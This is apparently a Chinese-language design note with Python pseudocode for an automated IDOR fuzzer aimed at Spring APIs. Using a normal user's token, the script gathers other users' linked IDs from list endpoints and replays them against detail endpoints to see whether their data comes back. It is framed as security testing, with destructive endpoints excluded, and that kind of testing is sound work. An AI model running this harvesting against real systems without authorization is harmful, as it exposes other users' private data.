# 🚀 API ID Chain Fuzzer 执行架构与伪代码实现思路

本工具的核心目标是：**实现从静态提取到动态漏洞验证（DAST）的无缝衔接。**
整个自动化探测机制分为三大模块：解析层、编排层与发包探测层。

## 1. 架构设计

### 模块 A: 路由与参数解析 (Parser)
- 依赖于 `java-route-mapper/scripts/spring_route_extractor.py`。
- 将生成的 `routes.json` 投递给新编写的 `id_chain_analyzer.py`。
- `id_chain_analyzer.py` 负责：
  1. **执行安全剔除**: 拦截所有包含 `delete`, `update`, `remove` 等修改数据库状态的接口。
  2. **构建串联图谱**: 将接口分为两类：
     - **Source (泄漏源)**: 带有 `list`, `page`, `search` 的 GET/POST 接口，预期返回 JSON 数组中包含目标 ID。
     - **Sink (受害者/靶点)**: 明确在 URL Params 或 Body 中需要传入类似 `userId`, `orderId` 的接口。

### 模块 B: AI 动态发包编排 (Fuzzer Orchestrator)
这部分由大模型 (AI) 通过执行特定的 Python 脚本或直接利用 HTTP 请求库来实现。

**步骤 1：获取基准权限 (Authentication)**
- 测试必须在一个普通用户的 Token/Cookie 环境下进行。

**步骤 2：信息收集与绑定 (Harvesting & ID Correlation)**
- AI 构造 HTTP 请求向 Source 接口发包（如 `/api/v1/users/list`）。
- **【关键改进】**：解析响应 JSON 数组时，**必须以 JSON 对象 (Object) 为单位提取 ID**，建立“绑定关系”。
  - 错误做法：把所有的 `userid` 丢进一个池子，把所有的 `openid` 丢进另一个池子。
  - 正确做法：从 `[{"userid": 1001, "openid": "wx_abc", "name": "..."}]` 中提取成对的字典 `{"userid": 1001, "openid": "wx_abc"}` 并缓存。这保证了在多参数碰撞时，不会出现“张三的 userid 搭配李四的 openid”导致后端校验失败。

**步骤 3：参数碰撞与越权验证 (Collision & Validation)**
- 遍历所有 Sink 接口。
- 将步骤 2 收集到的 **绑定的 ID 字典** 完整注入。如果接口同时需要 `userid` 和 `openid`，则一并传入。

## 2. 核心 Fuzzer 伪代码 (Python)

```python
import requests
import json
import re

ATTACKER_TOKEN = "Bearer eyJhbG..."
ATTACKER_ID = "1008"
BASE_URL = "http://target.com"

with open("chain_graph.json", "r") as f:
    graph = json.load(f)

headers = {
    "Authorization": ATTACKER_TOKEN,
    "Content-Type": "application/json"
}

# 用于存储绑定的 ID 对象集合
# 格式: [{"userid": 1001, "openid": "wx_abc"}, {"orderid": 505, "userid": 1001}]
bound_id_records = []

# ==========================================
# 阶段 1: 扫描 Sources 获取绑定的 ID 集合
# ==========================================
print("[*] Phase 1: Harvesting correlated IDs from Sources...")
for source in graph["sources_for_leakage"]:
    try:
        if source["method"] == "GET":
            res = requests.get(BASE_URL + source["path"], headers=headers, timeout=5)
            
            # 尝试解析 JSON 寻找对象数组
            try:
                json_data = res.json()
                # 简单递归查找所有的 list/array
                def extract_objects(obj):
                    if isinstance(obj, list):
                        for item in obj:
                            if isinstance(item, dict):
                                # 提取单个对象内的所有 ID 字段，保持绑定关系
                                id_dict = {k: v for k, v in item.items() if str(k).lower().endswith('id')}
                                if id_dict and id_dict.get('userid') != ATTACKER_ID: # 排除自己
                                    if id_dict not in bound_id_records:
                                        bound_id_records.append(id_dict)
                            extract_objects(item)
                    elif isinstance(obj, dict):
                        for k, v in obj.items():
                            extract_objects(v)
                            
                extract_objects(json_data)
            except json.JSONDecodeError:
                pass
    except Exception as e:
        continue

print(f"[+] Harvested {len(bound_id_records)} bound ID objects.")

# ==========================================
# 阶段 2: 针对 Sinks 进行成对的越权 Fuzzing
# ==========================================
print("[*] Phase 2: Fuzzing Sinks with bound IDs...")
for sink in graph["sinks_for_exploitation"]:
    path = sink["path"]
    method = sink["method"]
    req_ids = sink["required_ids"] # 例如 ["userid", "openid"]
    
    # 筛选出同时包含该 Sink 所需所有 ID 的缓存记录
    applicable_records = [rec for rec in bound_id_records if all(req_id in rec for req_id in req_ids)]
    
    for record in applicable_records[:5]:  # 每个接口挑 5 组数据测试即可
        # 构造攻击 URL，注入绑定的参数
        target_url = BASE_URL + path
        if method == "GET":
            # 拼接: ?userid=1001&openid=wx_abc
            query_str = "&".join([f"{k}={v}" for k, v in record.items() if k in req_ids])
            target_url += f"?{query_str}"
            
            res = requests.get(target_url, headers=headers)
            
            # 判断越权是否成功
            if res.status_code == 200 and str(record[req_ids[0]]) in res.text:
                print(f"[!!!] VULNERABILITY FOUND (IDOR):")
                print(f"      Endpoint: {target_url}")
                print(f"      Payload: {record}")
                print(f"      Leaked Info: {res.text[:100]}...")
```

## 3. 落地建议
对于纯白盒（SAST）场景，AI 可以在提取出 `chain_graph.json` 后，**直接审阅对应 Controller 的源码**。
AI 不需要真的发包，只需做以下推理：
1. 接口 A (Source) 确实没有加 `@RequiresRoles("ADMIN")`，普通用户可查。
2. 接口 B (Sink) 接收了 `userId`，但代码里直接调用了 `userService.getById(userId)`，**完全没有进行** `if (currentLoginId != userId)` 的判断逻辑。
3. 结论：存在 IDOR 漏洞。

这是一种将 DAST 动态思想转化为 SAST 静态追踪规则的完美范例。